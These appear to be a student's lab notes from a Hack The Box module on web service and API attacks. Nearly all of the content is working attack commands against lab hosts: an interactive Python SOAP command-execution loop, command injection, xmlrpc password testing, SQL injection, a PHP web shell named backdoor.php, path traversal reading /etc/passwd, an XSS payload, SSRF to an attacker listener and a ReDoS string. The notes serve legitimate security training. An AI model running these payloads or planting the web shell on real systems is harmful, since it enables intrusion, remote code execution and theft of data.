
# Web Service & API Attacks 


# Web Services Description Language (WSDL)

 If you should think of the operation object in WSDL as a programming concept, which of the following is closer in terms of the provided functionality? Answer options (without quotation marks): "Data Structure", "Method", "Class" 

```bash
dirb http://<TARGET IP>:3002

curl http://<TARGET IP>:3002/wsdl 

ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3002/wsdl?FUZZ' -fs 0 -mc 200

```

# SOAPAction Spoofing


Exploit the SOAPAction spoofing vulnerability and submit the architecture of the web server as your answer. Answer options (without quotation marks): "x86_64", "x86" 




```bash

 curl http://<TARGET IP>:3002/wsdl?wsdl 

```

```python
import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)


```


# Command Injection




```bash

sudo tcpdump -i tun0 icmp


curl http://10.129.89.130:3003/ping-server.php/ping/10.10.16.3/3

curl http://10.129.89.130:3003/ping-server.php/system/whoami



```

# Attacking WordPress 'xmlrpc.php'


```bash
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php


```


# Information Disclosure (with a twist of SQLi)


```bash

ffuf -w "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://10.129.89.130:3003/?FUZZ=test_value' -fs 19


curl http://10.129.89.130:3003/?id=1'+or+'1'='1


```


# Arbitrary File Upload
## PHP File Upload via API to RCE

https://academy.hackthebox.com/module/160/section/1500 -> how to get a stable reverse shell in php

backdoor.php

```php
<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd); die; }?>


```

```bash

curl http://10.129.89.130:3001/uploads/backdoor.php?cmd=hostname


```

# Local File Inclusion (LFI)


```bash

curl http://10.129.202.133:3000/api

ffuf -w "/usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://10.129.202.133:3000/api/FUZZ'

curl http://10.129.202.133:3000/api/download/..%2f..%2f..%2f..%2fetc%2fpasswd


```


# Cross-Site Scripting (XSS)


```bash
http://<TARGET IP>:3000/api/download/%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E

```


# Server-Side Request Forgery (SSRF)



```bash
echo "http://<VPN/TUN Adapter IP>:<LISTENER PORT>" | tr -d '\n' | base64

curl "http://<TARGET IP>:3000/api/userinfo?id=<BASE64 blob>"

```

# Regular Expression Denial of Service (ReDoS)

```bash
curl "http://<TARGET IP>:3000/api/check-email?email=test_value"

curl "http://<TARGET IP>:3000/api/check-email?email=jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555."


```

# XML External Entity (XXE) Injection

```bash



``` 
